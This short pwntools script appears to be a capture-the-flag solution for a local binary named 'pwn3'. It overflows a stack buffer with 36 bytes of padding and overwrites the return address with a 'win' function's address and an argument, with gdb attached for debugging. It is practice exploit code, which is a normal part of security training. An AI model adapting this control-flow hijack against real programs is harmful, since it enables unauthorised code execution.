from pwn import *

binary = "./pwn3"

r = process(binary)

e = ELF(binary)
win = e.symbols['win']
gdb.attach(r,"""
b *vuln + 43
c
""")
print(hex(win))
payload = flat("A"*36,p32(win),"B"*4,p32(0xdeadbeef))

r.recv()
r.sendline(payload)
r.interactive()
